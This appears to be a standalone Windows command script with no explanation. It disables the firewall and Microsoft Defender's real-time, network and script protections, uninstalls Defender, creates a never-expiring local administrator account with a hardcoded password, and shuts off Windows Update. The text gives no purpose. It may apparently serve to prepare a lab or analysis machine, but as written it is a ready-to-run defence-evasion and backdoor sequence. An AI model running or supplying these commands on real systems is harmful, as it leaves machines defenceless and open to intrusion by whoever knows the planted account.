
netsh advfirewall set allprofiles state off && powershell Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
powershell Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend
powershell Uninstall-WindowsFeature -Name Windows-Defender
powershell Remove-WindowsFeature Windows-Defender, Windows-Defender-GUI
powershell Get-Service WinDefend | Stop-Service -PassThru | Set-Service -StartupType Disabled
powershell Set-MpPreference -DisableIOAVProtection $true
powershell Set-MpPreference -DisableRealtimeMonitoring $true 
powershell New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force
net user mylocaladmin p@ssw0rd! /add /expires:never
net localgroup administrators mylocaladmin /add
powershell $AUSettings = (New-Object -com "Microsoft.Update.AutoUpdate").Settings
powershell $AUSettings.NotificationLevel = 1
powershell $AUSettings.Save
sc.exe config wuauserv start=disabled
sc.exe query wuauserv
sc.exe stop wuauserv
sc.exe query wuauserv
REG.exe QUERY HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\wuauserv /v Start  